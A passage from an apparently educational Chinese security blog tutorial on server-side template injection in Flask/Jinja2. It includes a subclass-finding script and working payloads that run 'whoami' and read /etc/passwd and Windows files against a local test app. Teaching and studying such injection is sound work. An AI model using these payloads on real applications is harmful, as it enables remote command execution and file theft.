+<p>可以看到结果是一个元组，而元组的第一个元素是基类 <code>object</code> ，所以要获取基类需要 <code>.__bases__[0]</code> ; 我们下面看看基类下的所有子类 ，键入： <code>"".__class__.__bases__[0].__subclasses__()</code></p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t01694629c956b130fe.png"></p>
+<p>这里可以看到有相当多的子类，且不同的Python版本在这里获取到的所有子类的顺序也不同，但是这样还是不太直观毕竟有几百个子类，我们用个小脚本进行筛选看看各个子类所处空间下可调用的模块、方法和变量都有什么也就是 <code>function.__globals__</code> 的结果。下面贴个寻找类对应顺序的脚本：</p>
+<p>用法大概是这样的，因为大概思路前面前三步基本差不多，主要是后面 <code>__init__.__globals__</code> 后面的姿势会很多，也是一个难理解的点。这个脚本就是找从<code>__init__.__globals__</code> 后面想要根据那个思路入手取执行命令或读取文件，比如下面我想用 <code>__builtins__</code> 去构造执行命令的继承链: 先查询都哪些子类调用了<code>__builtins__</code></p>
+<p>find.py</p>
+<pre><code class="hljs language-csharp">search = <span class="hljs-string">'__builtins__'</span>   
+num = <span class="hljs-number">-1</span>
+<span class="hljs-function"><span class="hljs-keyword">for</span> i <span class="hljs-title">in</span> ().__class__.__bases__[0].__<span class="hljs-title">subclasses__</span>():
+    num +</span>= <span class="hljs-number">1</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">in</span> i.__init__.__globals__.keys():
+            print(i, num)
+    except:
+        pass
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t0197beb8b312352a1c.png"></p>
+<p>这里拿经典的 <code>&lt;class 'os._wrap_close'&gt; 128</code> 举例，构造payload如下：</p>
+<p><code>http://127.0.0.1:5000/?name={{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}</code></p>
+<p>ps：eval()函数用来执行一个字符串表达式，并返回表达式的值，这里相当于调用了os模块利用popen函数执行whoami</p>
+<p><img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t0119b7dc663a3fcc74.png"></p>
+<p>当然利用<code>__builtins__</code>还有很多其他姿势，需要注意的就是python2与python3中有些函数不一样需要进行替换</p>
+<p><strong>Python3 payload</strong></p>
+<pre><code class="hljs language-scss"># <span class="hljs-number">0</span>x01 利用<span class="hljs-built_in">eval</span>()将其中字符串作为代码执行  
+{{()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[128]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">'eval'</span>]</span>("__import__('os')<span class="hljs-selector-class">.system</span>('whoami')")}}
+
+
+{{()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[128]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">'eval'</span>]</span>("__import__('os')<span class="hljs-selector-class">.popen</span>('whoami')<span class="hljs-selector-class">.read</span>()")}}
+
+# <span class="hljs-number">0</span>x02 直接调用<span class="hljs-built_in">__import__</span>()构造payload执行命令
+{{()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[128]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">'__import__'</span>]</span>('os')<span class="hljs-selector-class">.popen</span>('whoami')<span class="hljs-selector-class">.read</span>()}}
+
+# <span class="hljs-number">0</span>x03 调用<span class="hljs-built_in">open</span>()读取文件
+{{()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[128]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">'open'</span>]</span>('C:\\Windows\win.ini')<span class="hljs-selector-class">.read</span>()}}
+</code></pre>
+<p><strong>python2 payload</strong></p>
+<p>（1）linecache执行命令</p>
+<p>同样是先找到子类中有可直接调用linecache的，</p>
+<p><img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t0106b54c1aca35f9f9.png"></p>
+<pre><code class="hljs language-kotlin">(&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">warnings</span>.<span class="hljs-title">WarningMessage</span>'&gt;, <span class="hljs-type">59)</span></span>
+(&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">warnings</span>.<span class="hljs-title">catch_warnings</span>'&gt;, <span class="hljs-type">60)</span></span>
+</code></pre>
+<p>payload</p>
+<pre><code class="hljs language-scss">{{<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-attr">[<span class="hljs-string">'linecache'</span>]</span><span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.popen</span>('whoami')<span class="hljs-selector-class">.read</span>()}}
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t01b61e591f8f4ad91b.png"></p>
+<p>（2） file类读取文件</p>
+<p>file类是只存在python2的，python3没有，但是类似于open</p>
+<p>payload</p>
+<pre><code class="hljs language-scss">{{()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>('/etc/passwd')<span class="hljs-selector-class">.read</span>()}}
+
+{{()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>('/etc/passwd')<span class="hljs-selector-class">.readlines</span>()}}
+</code></pre>
+<h3 name="h3-19" id="h3-19">&lt;a name=”0x02 <code>['popen']("command").read()</code>” class=”reference-link”&gt;0x02 <code>['popen']("command").read()</code>
+</h3>
+<p>这里思路是直接找某个子类可以直接调用popen这个方法，这里在本地找到的是 <code>os._wrap_close</code> 这个类。</p>
+<p>payload</p>
+<pre><code class="hljs language-scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5000</span>/?name={{""<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[128]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'popen'</span>]</span>("whoami")<span class="hljs-selector-class">.read</span>()}}`
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t01c1d2c4e0ea168673.png"></p>
+<h3 name="h3-20" id="h3-20">0x03 直接调用 <code>__import__()</code>
+</h3>
+<p>这里思路是找子类中可以直接调用 <code>__import__()</code> 然后引用 os 模块去执行命令</p>
+<p>先通过find.py找到可以直接调用 <code>__import__()</code>的子类</p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t01c61d9bc43ba144e0.png"></p>
+<p>之后通过 <code>__import__()</code> 调用os模块去执行命令，payload如下：</p>
+<pre><code class="hljs language-markdown">{{"".<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[75].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__import__</span>('os').popen('whoami').read()}}
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t01e607b9f1a6d95d79.png"></p>
+<h3 name="h3-21" id="h3-21">
+<a class="reference-link" name="0x04%20%E5%88%A9%E7%94%A8%E5%BE%AA%E7%8E%AF%E6%9E%84%E9%80%A0payload"></a>0x04 利用循环构造payload</h3>
+<p>上面提到过 <code>{% for i in [1, 2, 3] %}Zh1z3ven{%endfor%}</code> 可用作循环。我们改造下0x01 中利用 <code>os._wrap_close</code> 类的 <code>['__builtins__']['eval']</code> 注入</p>
+<p><strong>执行命令的payload</strong>如下,这里有一个小坑点，比如我们第一次if判断 <code>if i.__name__ == '_wrap_close'</code>时，==右面不能写 <code>os._wrap_close</code> 而要写<code>_wrap_close</code> ,因为 <code>__name__</code> 返回值是 <code>_wrap_close</code></p>
+<p><img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t01a0903a24d055be08.png"></p>
+<pre><code class="hljs language-php">{% <span class="hljs-keyword">for</span> i in <span class="hljs-string">""</span>.<span class="hljs-keyword">__class__</span>.__base__.__subclasses__() %}
+{% <span class="hljs-keyword">if</span> i.__name__ == <span class="hljs-string">'_wrap_close'</span> %}
+  {% <span class="hljs-keyword">for</span> x in i.__init__.__globals__.values() %}   
+  {% <span class="hljs-keyword">if</span> x.<span class="hljs-keyword">__class__</span> == {}.<span class="hljs-keyword">__class__</span> %}  <span class="hljs-comment"># 筛选出dict类型元素</span>
+    {% <span class="hljs-keyword">if</span> <span class="hljs-string">'eval'</span> in x.keys() %}  
+        {{ x[<span class="hljs-string">'eval'</span>](<span class="hljs-string">'__import__("os").popen("whoami").read()'</span>)}}
+    {% <span class="hljs-keyword">endif</span> %}
+  {% <span class="hljs-keyword">endif</span> %}
+  {% <span class="hljs-keyword">endfor</span> %}
+{% <span class="hljs-keyword">endif</span> %}
+{% <span class="hljs-keyword">endfor</span> %}
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p2.ssl.qhimg.com/t015ab8c86115a47699.png"></p>
+<p><strong>读取文件payload</strong>,注意Windows环境需要 <code>\\</code> 标识路径</p>
+<pre><code class="hljs language-php">{% <span class="hljs-keyword">for</span> i in <span class="hljs-string">""</span>.<span class="hljs-keyword">__class__</span>.__base__.__subclasses__() %}{% <span class="hljs-keyword">if</span> i.__name__ == <span class="hljs-string">'_wrap_close'</span> %}{{i.__init__.__globals__[<span class="hljs-string">'__builtins__'</span>].open(<span class="hljs-string">'C:\\Users\\LENOVO\\Desktop\\1.txt'</span>, <span class="hljs-string">'r'</span>).readlines()}}{% <span class="hljs-keyword">endif</span> %}{% <span class="hljs-keyword">endfor</span> %}
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t018016eaf6442d85fd.png"></p>
+<p>&nbsp;</p>
+<h2 name="h2-22" id="h2-22">小结</h2>
+<p>当然关于SSTI利用远不止这些，且还有常见的过滤以及被ban函数的相关绕过姿势这里也没有写上，准备下一篇记录关于CTF基于常见的过滤的绕过姿势。这篇主要还是放在理解Flask+jinja2语法和SSTI这个洞入门。</p>
+<p>&nbsp;</p>
+<h2 name="h2-23" id="h2-23">参考文章</h2>
+<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a><br><a href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a><br><a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a><br><a href="https://www.cnblogs.com/chaojiyingxiong/p/9549987.html">https://www.cnblogs.com/chaojiyingxiong/p/9549987.html</a><br><a href="https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n">https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n</a><br><a href="https://www.anquanke.com/post/id/85571">https://www.anquanke.com/post/id/85571</a><br><a href="https://hetian.blog.csdn.net/article/details/111399386">https://hetian.blog.csdn.net/article/details/111399386</a><br><a href="https://xz.aliyun.com/t/2308#toc-10">https://xz.aliyun.com/t/2308#toc-10</a></p>
+
+</div><div class="_53" style="display: none;"> 本文翻译自 <a href="https://www.anquanke.com/post/id/226900" target="_blank">原文链接</a>。如若转载请注明出处。 </div><div class="_206" style="display: none;"> 商务合作，文章发布请联系 anquanke@360.cn </div><div class="_59"><p> 本文由<b>Zh1z3ven</b>原创发布 </p><p> 转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/226900" target="_blank">https://www.anquanke.com/post/id/226900</a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_62" style="display: none;"><p> 本文转载自: <a href="https://www.anquanke.com/post/id/226900"></a></p><p> 如若转载,请注明出处： <a href="https://www.anquanke.com/post/id/226900" target="_blank"></a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_63 share1"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" title="https://anquanke.com/post/id/226900" style="display: none;"><canvas width="90" height="90" style="display: none;"></canvas><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABaCAYAAAA4qEECAAAAAXNSR0IArs4c6QAABJVJREFUeF7tndtW6zAMRNP//+iyWtpzEqeS91hOSmF4BNeX0Wh0sYHLsizXZfLX9fp/ysvlEs6+HqduIZtXnYvuV513Pf6GgoGGxDDQFQRuTDsb6FmuXJknwyySi2i99fh2TPSz7DOKPdu9bqSjAtCsDRrojjkN9BYgzGgS1SNtI99v7UbWi2xNpKP9LPmMqt3Z+FA6yMEJoJTpZD0DvSxLNbgY6ESbVUZn7kuZ34v8dB6VGIQIP0Y6DPQDgVniT+chHtFjcBZUs3T1TzGaBDcqBc+5iIvfxv7qrIOys8J0A01RTnoPpHL9OKAFXO5DiYu3IFTcl8QBMqaVEXIOgg2uDMlkm37rqu9MAKzqJAGRjDHQnUyIgEjGvAVolcXVrKGSYpGAWW2TzsLjLq1n3rBUe8KzDJPFFBpMVSMY6LNuWK4kZ1LNF4zPsg7C1vW0NOASeZt0vHSai4E+A+ZlMdDn4KwHQ+KyJCOg54uCE9kHkZrRYuvV/nGblByeHNBAbyvlofTOQMd0xIxWExCSKWSLq+sRj4vG0IyHrEH2PbXXYaBjsxjoTg/FjCYIJGPeLh3rgkXtxap9AaJtGZ5kf2o6WLTfpg+fpZObgoUcZD2Zgd6ncU98dg00M7rGaepBIaNJVaV6AJUFcnS1KFK9r92DKnu7rCNitIHeQm2gBy+GidcQstECSe7eERckZfptg6r7VwLxiBSQgowaw0DD3Jtc9GbyYqDfATRxFdXd6U105ILqnqhmEnkjAZBI6W1PqGCpHNZAf5veQDcuoNYGmNFHv+tQ06i79YPnZQQEevBoXxVpTAsyAx0XJjMNe/gDGjN6UKNVl8sSeiIRajZCsw5CgIqMDHXviO6NJPQGeuA9moHOH+OHlWElEJBEv80uaM/gOY70gYkn0h6Iul4qHVHThlRRKlAG+oGYGb3l+imMnhWhM1dWNZ7IQtpNE3/nhuwvzbCiZ7vkIGrqZaBfUNZAs1YAqSvu8WhdgtNs4dXkRNPTXkDwZ9tIIB4ZQ4hE8KDnNtCJ9Q30wIXsLq9N/vDhE/upQFeCoeqyI8GQrEGyopExpNeBpcNAxyYw0I10jLCVfMZAfzrQaspDxhPm0DFqcKLzzhqH33UQ4NRSdNYhbvMY6JloTsxrT9rWv2Uwo4/YGH3XoXqKyu4sj1bnGsFJfhKmLmKgvxEz0Cdp/1ufG5Dgm/V4e80t6n1qvqy2h3fdO7qx3jiieffFQb/BQBezgz8NNGViz2XpPLQh01tPZX1rZLLf8p3hOxv/Bronwi9+PgLayGeeSxOGZcdQ1ybrpalsxGgSqEi0HrAZerarzjvS+I/WIMXVbj0DrZqM/YMcA/3AlXjsRzGaaqGqgSOZRgRctEdiDHrV9uP/PciIHqpiYKDh82GSB49kIL+e0Wo2MwIIkbTKmHZPP1I6DHTjfwQQwoqsJCaf/2hGHxFQaNFAIvlRurw+t2rAocrQQLM2LvHqXT+6whKSIpnRKn0747GVxV9FHjEmKVKi4ofEh0hq0hJ8Ft4Gev8G5fA7w+otODGayrzsdoesR7zEjO40lY4C+gt91ffmhLFY0gAAAABJRU5ErkJggg==" style="display: block;"></div></div><ul class="_65"><li><a target="_blank" href="https://www.anquanke.com/tag/SSTI">SSTI</a></li></ul><div class="_56"><div class="line line1"><div class="_18 item1"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">4赞</span></div><div class="_12 item1"><i class=""></i><span>收藏</span></div></div><div class="line line2"><div class="user"><img class="avatar" src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/132"><span class="name">Zh1z3ven</span><span class="label label-"></span></div><div class="_63 share2"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" title="https://anquanke.com/post/id/226900" style="display: none;"><canvas width="90" height="90" style="display: none;"></canvas><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABaCAYAAAA4qEECAAAAAXNSR0IArs4c6QAABJVJREFUeF7tndtW6zAMRNP//+iyWtpzEqeS91hOSmF4BNeX0Wh0sYHLsizXZfLX9fp/ysvlEs6+HqduIZtXnYvuV513Pf6GgoGGxDDQFQRuTDsb6FmuXJknwyySi2i99fh2TPSz7DOKPdu9bqSjAtCsDRrojjkN9BYgzGgS1SNtI99v7UbWi2xNpKP9LPmMqt3Z+FA6yMEJoJTpZD0DvSxLNbgY6ESbVUZn7kuZ34v8dB6VGIQIP0Y6DPQDgVniT+chHtFjcBZUs3T1TzGaBDcqBc+5iIvfxv7qrIOys8J0A01RTnoPpHL9OKAFXO5DiYu3IFTcl8QBMqaVEXIOgg2uDMlkm37rqu9MAKzqJAGRjDHQnUyIgEjGvAVolcXVrKGSYpGAWW2TzsLjLq1n3rBUe8KzDJPFFBpMVSMY6LNuWK4kZ1LNF4zPsg7C1vW0NOASeZt0vHSai4E+A+ZlMdDn4KwHQ+KyJCOg54uCE9kHkZrRYuvV/nGblByeHNBAbyvlofTOQMd0xIxWExCSKWSLq+sRj4vG0IyHrEH2PbXXYaBjsxjoTg/FjCYIJGPeLh3rgkXtxap9AaJtGZ5kf2o6WLTfpg+fpZObgoUcZD2Zgd6ncU98dg00M7rGaepBIaNJVaV6AJUFcnS1KFK9r92DKnu7rCNitIHeQm2gBy+GidcQstECSe7eERckZfptg6r7VwLxiBSQgowaw0DD3Jtc9GbyYqDfATRxFdXd6U105ILqnqhmEnkjAZBI6W1PqGCpHNZAf5veQDcuoNYGmNFHv+tQ06i79YPnZQQEevBoXxVpTAsyAx0XJjMNe/gDGjN6UKNVl8sSeiIRajZCsw5CgIqMDHXviO6NJPQGeuA9moHOH+OHlWElEJBEv80uaM/gOY70gYkn0h6Iul4qHVHThlRRKlAG+oGYGb3l+imMnhWhM1dWNZ7IQtpNE3/nhuwvzbCiZ7vkIGrqZaBfUNZAs1YAqSvu8WhdgtNs4dXkRNPTXkDwZ9tIIB4ZQ4hE8KDnNtCJ9Q30wIXsLq9N/vDhE/upQFeCoeqyI8GQrEGyopExpNeBpcNAxyYw0I10jLCVfMZAfzrQaspDxhPm0DFqcKLzzhqH33UQ4NRSdNYhbvMY6JloTsxrT9rWv2Uwo4/YGH3XoXqKyu4sj1bnGsFJfhKmLmKgvxEz0Cdp/1ufG5Dgm/V4e80t6n1qvqy2h3fdO7qx3jiieffFQb/BQBezgz8NNGViz2XpPLQh01tPZX1rZLLf8p3hOxv/Bronwi9+PgLayGeeSxOGZcdQ1ybrpalsxGgSqEi0HrAZerarzjvS+I/WIMXVbj0DrZqM/YMcA/3AlXjsRzGaaqGqgSOZRgRctEdiDHrV9uP/PciIHqpiYKDh82GSB49kIL+e0Wo2MwIIkbTKmHZPP1I6DHTjfwQQwoqsJCaf/2hGHxFQaNFAIvlRurw+t2rAocrQQLM2LvHqXT+6whKSIpnRKn0747GVxV9FHjEmKVKi4ofEh0hq0hJ8Ft4Gev8G5fA7w+otODGayrzsdoesR7zEjO40lY4C+gt91ffmhLFY0gAAAABJRU5ErkJggg==" style="display: block;"></div></div></div></div></div><div class="_60"><h2 class="g-title">推荐阅读</h2><ul><li><a href="https://www.anquanke.com/post/id/289260"><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t01ecfc10734bb0a594.jpg"><h5 class="g-line2">RBAC 和 Keto（Go RBAC 框架）</h5><p>2023-06-16 18:31:25</p></a></li><li><a href="https://www.anquanke.com/post/id/289299"><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t01631accaaecf8e083.jpg"><h5 class="g-line2">API NEWS | Booking.com爆出API漏洞</h5><p>2023-06-16 17:57:51</p></a></li><li><a href="https://www.anquanke.com/post/id/289298"><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t010bea9d3bd19acbe5.jpg"><h5 class="g-line2">RBAC 和 Keto（Go RBAC 框架）</h5><p>2023-06-16 17:57:09</p></a></li><li><a href="https://www.anquanke.com/post/id/289234"><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t01541abcaaa3b796e4.jpg"><h5 class="g-line2">案例分享 | 银行API安全解决方案</h5><p>2023-06-16 17:56:08</p></a></li></ul></div><div class="_7 index-comment"><h2 class="g-title">发表评论</h2><div class="login"><p class="login-text">您还未登录，请先登录。</p><p class="login-bar"><a href="https://www.anquanke.com/login/index.html">登录</a></p></div><h2 class="g-title">评论列表</h2><ul class="body"><li class="body-item"><a href="https://www.anquanke.com/member.html?memberId=146893" class="body-item-avatar"><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t010f571daeba245bf5.png"></a><div class="item-main"><div class="item-main-top"><a href="https://www.anquanke.com/member.html?memberId=146893" class="item-main-name">奶思</a><span class="item-main-time">2021-01-12 21:50</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">0赞</span></div><button>回复</button></div><div class="item-main-content">也就是还是接收外部输入的缘故，但是现实场景中估计会偏少吧，我貌似又懂了[手动狗头.jpg]</div><!----><div class="body-item-sub"><div class="body-item"><a class="body-item-avatar"><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/132"></a><div class="item-main"><div class="item-main-top"><span class="item-main-name">Zh1z3ven</span><span class="item-main-time">2021-01-12 22:15</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">0赞</span></div></div><div class="item-main-content">是的呢🙃</div></div></div></div></div></li></ul><!----></div></div><div class="index-side"><div class="index-side-top"><div class="_66"><img class="banner" src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t014757b72460d855bf.png"><div class="w"><a class="avatar" href="https://www.anquanke.com/member.html?memberId=155804"><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/132"></a><p class="info"><a href="https://www.anquanke.com/member.html?memberId=155804" class="name">Zh1z3ven</a><a href="https://www.anquanke.com/member.html?memberId=155804" class="user-label user-label-"></a></p><p class="hint">这个人太懒了，签名都懒得写一个</p><div class="bottom"><ul class="bottom-1"><li>文章</li><li><strong>4</strong></li></ul><ul class="bottom-2"><li>粉丝</li><li><strong>1</strong></li></ul><div class="spacer"></div><!----></div></div></div><div class="_64"><h3 class="title"> TA的文章</h3><ul><li><h5><a href="https://www.anquanke.com/post/id/254519">Java安全之Thymeleaf SSTI分析</a></h5><p>2021-11-02 16:30:03</p></li><li><h5><a href="https://www.anquanke.com/post/id/248004">Java安全之ysoserial-URLDNS链分析</a></h5><p>2021-08-30 17:30:21</p></li><li><h5><a href="https://www.anquanke.com/post/id/226900">初探 Python Flask+Jinja2 SSTI</a></h5><p>2021-01-12 16:30:55</p></li><li><h5><a href="https://www.anquanke.com/post/id/225451">Supervisord远程命令执行漏洞复现（CVE-2017-11610）</a></h5><p>2020-12-22 14:30:30</p></li></ul></div><div class="_61"><h3 class="title"> 相关文章</h3><ul><li><h5><a href="https://www.anquanke.com/post/id/260335">Latte-SSTI-Payloads总结</a></h5><p>2021-12-13 16:30:02</p></li><li><h5><a href="https://www.anquanke.com/post/id/254519">Java安全之Thymeleaf SSTI分析</a></h5><p>2021-11-02 16:30:03</p></li><li><h5><a href="https://www.anquanke.com/post/id/246293">梨子带你刷burpsuite靶场系列之高级漏洞篇 - 服务器端模板注入(SSTI)专题</a></h5><p>2021-08-28 10:00:20</p></li><li><h5><a href="https://www.anquanke.com/post/id/246094">SSTI漏洞学习（下）——Flask/Jinja模板引擎的相关绕过</a></h5><p>2021-08-03 10:00:06</p></li><li><h5><a href="https://www.anquanke.com/post/id/246093">SSTI漏洞学习 (上)——基础知识和一些不常见的模板引擎介绍</a></h5><p>2021-07-30 15:30:35</p></li><li><h5><a href="https://www.anquanke.com/post/id/228176">浅析Python SSTI/沙盒逃逸</a></h5><p>2021-01-29 14:30:10</p></li><li><h5><a href="https://www.anquanke.com/post/id/226544">详解模板注入漏洞（上）</a></h5><p>2020-12-29 15:30:23</p></li></ul></div><div class="_52"><h3 class="title">热门推荐</h3><ul></ul></div></div><div class="_57"><div class="wrap"><div class="title">文章目录</div><ul class="list"><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/226900#h2-0">SSTI简介</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/226900#h2-1">Flask</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-2">Flask简介</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-3">Flask安装</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-4">创建Flask项目</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-5">Flask e.g.</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-6">Flask中的路由</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-7">main入口</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/226900#h2-8">Jinja2渲染模板</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-9">简介</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-10">基本语法</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-11">存在漏洞的Demo</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-12">不存在漏洞的Demo</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/226900#h2-13">SSTI思路</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-14">内置类属性和方法</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-15">利用思路</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/226900#h2-16">STTI利用</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-17">测试代码</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-18">0x01 __bultins__</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-19">&lt;a name="0x02 ['popen']("command").read()" class="reference-link"&gt;0x02 ['popen']("command").read()</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-20">0x03 直接调用 __import__()</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/226900#h3-21">0x04 利用循环构造payload</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/226900#h2-22">小结</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/226900#h2-23">参考文章</a><ul></ul></li></ul></div></div></div></div><div class="_8"><div class="g-w main"><div class="col1"><p class="col1-logo"><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t018717b31ed82fff86.png"></p><div class="col1-link"><b class="col1-weixin"></b><a href="https://weibo.com/360adlab" class="col1-sina"></a><a href="https://zhuanlan.zhihu.com/c_118578260" class="col1-zhi"></a></div></div><div class="col2"><div class="title">安全客</div><ul class="col2-list"><li><a href="https://www.anquanke.com/about" rel="noopener noreferrer" target="_blank">关于我们</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系我们</a></li><li><a href="https://www.anquanke.com/note/protocol" target="_blank" rel="noopener noreferrer">用户协议</a></li></ul></div><div class="col3"><div class="title">商务合作</div><ul class="col3-list"><li><a href="https://www.anquanke.com/note/business" target="_blank" rel="noopener noreferrer">合作内容</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系方式</a></li><li><a href="https://www.anquanke.com/link" target="_blank" rel="noopener 